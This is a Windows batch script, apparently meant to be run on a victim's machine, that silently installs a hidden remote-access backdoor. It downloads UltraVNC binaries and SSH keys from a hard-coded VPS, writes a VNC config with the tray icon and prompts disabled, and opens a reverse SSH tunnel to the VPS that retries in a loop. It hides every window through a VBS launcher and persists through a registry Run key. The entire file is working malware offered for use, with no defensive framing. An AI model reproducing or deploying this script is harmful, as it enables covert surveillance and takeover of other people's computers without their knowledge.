@echo off
REM ================================================================
REM Run ON THE TARGET (no admin needed). Fully SILENT:
REM   - no console windows (VBS hidden launcher)
REM   - no winvnc settings dialog (ini + portable marker written
REM     BEFORE first launch)
REM   - downloads arch-matched UltraVNC set + keys from VPS
REM   - reverse SSH tunnel VPS:5901 -> here:5900, autostart via HKCU
REM NOTE: Windows may still show a ONE-TIME firewall prompt for
REM winvnc.exe - unavoidable without admin; harmless (loopback only).
REM ================================================================

setlocal
set VPS=5.231.61.144
set D=%APPDATA%\vnc
set SSH=C:\Windows\System32\OpenSSH\ssh.exe
set ARCH=%PROCESSOR_ARCHITECTURE%

if /i "%ARCH%"=="AMD64" (
  set VNCBIN=winvnc.exe
  set DDENGINE=ddengine_x64.dll
  set VNCHOOKS=vnchooks_x64.dll
  set LOGGING=logging_x64.dll
  set LOGMSG=logmessages_x64.dll
) else (
  set VNCBIN=winvnc_x86.exe
  set DDENGINE=ddengine_x86.dll
  set VNCHOOKS=vnchooks_x86.dll
  set LOGGING=logging_x86.dll
  set LOGMSG=logmessages_x86.dll
)

mkdir "%D%" 2>nul
set LOG=%D%\setup.log
echo [%date% %time%] === setup started (arch=%ARCH%) ===>>"%LOG%"

REM --- kill any leftovers from older versions so the new config applies
taskkill /f /im ssh.exe >nul 2>&1
taskkill /f /im plink.exe >nul 2>&1
taskkill /f /im winvnc.exe >nul 2>&1
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v VncServer /f >nul 2>&1
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v VncTunnel /f >nul 2>&1
echo [%date% %time%] killed old instances + removed legacy Run keys >>"%LOG%"

REM --- fetch the arch-matched file set + keys
if exist %SystemRoot%\System32\curl.exe (
  if not exist "%D%\winvnc.exe" curl -s -o "%D%\winvnc.exe" http://%VPS%:8000/%VNCBIN%
  if not exist "%D%\ddengine.dll" curl -s -o "%D%\ddengine.dll" http://%VPS%:8000/%DDENGINE%
  if not exist "%D%\vnchooks.dll" curl -s -o "%D%\vnchooks.dll" http://%VPS%:8000/%VNCHOOKS%
  if not exist "%D%\logging.dll" curl -s -o "%D%\logging.dll" http://%VPS%:8000/%LOGGING%
  if not exist "%D%\logmessages.dll" curl -s -o "%D%\logmessages.dll" http://%VPS%:8000/%LOGMSG%
  if not exist "%D%\ssh_key" curl -s -o "%D%\ssh_key" http://%VPS%:8000/ssh_key
  if not exist "%D%\tunnel_key.ppk" curl -s -o "%D%\tunnel_key.ppk" http://%VPS%:8000/tunnel_key.ppk
) else (
  if not exist "%D%\winvnc.exe" powershell -nologo -noprofile -command "[Net.ServicePointManager]::SecurityProtocol='Tls12';(New-Object Net.WebClient).DownloadFile('http://%VPS%:8000/%VNCBIN%','%D%\winvnc.exe')"
  if not exist "%D%\ddengine.dll" powershell -nologo -noprofile -command "[Net.ServicePointManager]::SecurityProtocol='Tls12';(New-Object Net.WebClient).DownloadFile('http://%VPS%:8000/%DDENGINE%','%D%\ddengine.dll')"
  if not exist "%D%\vnchooks.dll" powershell -nologo -noprofile -command "[Net.ServicePointManager]::SecurityProtocol='Tls12';(New-Object Net.WebClient).DownloadFile('http://%VPS%:8000/%VNCHOOKS%','%D%\vnchooks.dll')"
  if not exist "%D%\logging.dll" powershell -nologo -noprofile -command "[Net.ServicePointManager]::SecurityProtocol='Tls12';(New-Object Net.WebClient).DownloadFile('http://%VPS%:8000/%LOGGING%','%D%\logging.dll')"
  if not exist "%D%\logmessages.dll" powershell -nologo -noprofile -command "[Net.ServicePointManager]::SecurityProtocol='Tls12';(New-Object Net.WebClient).DownloadFile('http://%VPS%:8000/%LOGMSG%','%D%\logmessages.dll')"
  if not exist "%D%\ssh_key" powershell -nologo -noprofile -command "[Net.ServicePointManager]::SecurityProtocol='Tls12';(New-Object Net.WebClient).DownloadFile('http://%VPS%:8000/ssh_key','%D%\ssh_key')"
  if not exist "%D%\tunnel_key.ppk" powershell -nologo -noprofile -command "[Net.ServicePointManager]::SecurityProtocol='Tls12';(New-Object Net.WebClient).DownloadFile('http://%VPS%:8000/tunnel_key.ppk','%D%\tunnel_key.ppk')"
)
for %%F in (winvnc.exe ddengine.dll vnchooks.dll logging.dll logmessages.dll ssh_key tunnel_key.ppk) do (
  if not exist "%D%\%%F" (
    echo [%date% %time%] [-] missing file: %%F >>"%LOG%"
    exit /b 1
  )
)
echo [%date% %time%] all 7 payload files present >>"%LOG%"

REM --- OpenSSH refuses keys readable by other users: lock ACL to current user only
icacls "%D%\ssh_key" /inheritance:r /grant:r "%USERNAME%":F >nul 2>&1
echo [%date% %time%] ssh_key ACL locked to %USERNAME% >>"%LOG%"

REM --- config FIRST, so winvnc never shows its first-run dialog
REM passwd = UltraVNC stored form for "Damilare":
REM   des(plaintext, fixedkey) via d3des (= DES-ECB with bitrev key)
REM   + 2-char checksum (sum mod 256). See gen_vnc_hash.py.
> "%D%\ultravnc.ini" echo [ultravnc]
>> "%D%\ultravnc.ini" echo passwd=62fc563fb4f1c5b310
>> "%D%\ultravnc.ini" echo LoopbackOnly=1
>> "%D%\ultravnc.ini" echo AllowLoopback=1
>> "%D%\ultravnc.ini" echo FileTransfer=0
>> "%D%\ultravnc.ini" echo Prompt=0
>> "%D%\ultravnc.ini" echo DisableTrayIcon=1
>> "%D%\ultravnc.ini" echo [admin]
>> "%D%\ultravnc.ini" echo Secure=0
type nul > "%D%\ultravnc.portable"

REM --- SSH client fallback for pre-Win10
if not exist "%SSH%" (
  set PLINKURL=https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe
  if /i "%ARCH%"=="x86" set PLINKURL=https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe
  if exist %SystemRoot%\System32\curl.exe (
    curl -s -o "%D%\plink.exe" %PLINKURL%
  ) else (
    powershell -nologo -noprofile -command "[Net.ServicePointManager]::SecurityProtocol='Tls12';(New-Object Net.WebClient).DownloadFile('%PLINKURL%','%D%\plink.exe')"
  )
  if not exist "%D%\plink.exe" exit /b 1
  set SSH=%D%\plink.exe
)

REM --- tunnel loop script (logs every attempt + ssh stderr to tunnel.log)
> "%D%\tunnel_loop.bat" echo @echo off
>> "%D%\tunnel_loop.bat" echo set TLOG=%D%\tunnel.log
>> "%D%\tunnel_loop.bat" echo :loop
>> "%D%\tunnel_loop.bat" echo echo [%%date%% %%time%%] tunnel attempt ^>^> "%%TLOG%%"
if /i "%ARCH%"=="x86" goto plink_loop
>> "%D%\tunnel_loop.bat" echo "%SSH%" -N -R 5901:127.0.0.1:5900 -i "%D%\ssh_key" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -o ServerAliveInterval=15 -o ExitOnForwardFailure=yes tunneler@%VPS% 2^>^> "%%TLOG%%"
>> "%D%\tunnel_loop.bat" echo timeout /t 5 /nobreak ^>nul
>> "%D%\tunnel_loop.bat" echo goto loop
goto loop_done
:plink_loop
>> "%D%\tunnel_loop.bat" echo "%SSH%" -ssh -N -batch -i "%D%\tunnel_key.ppk" -R 5901:127.0.0.1:5900 tunneler@%VPS%
>> "%D%\tunnel_loop.bat" echo timeout /t 5 /nobreak ^>nul
>> "%D%\tunnel_loop.bat" echo goto loop
:loop_done

REM --- hidden launcher: starts both with ZERO visible windows
> "%D%\run_hidden.vbs" echo Set sh = CreateObject("WScript.Shell")
>> "%D%\run_hidden.vbs" echo sh.CurrentDirectory = "%D%"
>> "%D%\run_hidden.vbs" echo sh.Run """%D%\winvnc.exe"" -run", 0, False
>> "%D%\run_hidden.vbs" echo sh.Run "cmd /c ""%D%\tunnel_loop.bat""", 0, False

REM --- autostart + run now, all invisible
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v VncHidden /t REG_SZ /d "wscript.exe \"%D%\run_hidden.vbs\"" /f >nul
echo [%date% %time%] SETUP OK - launching hidden >>"%LOG%"
start "" /min wscript.exe "%D%\run_hidden.vbs"

endlocal
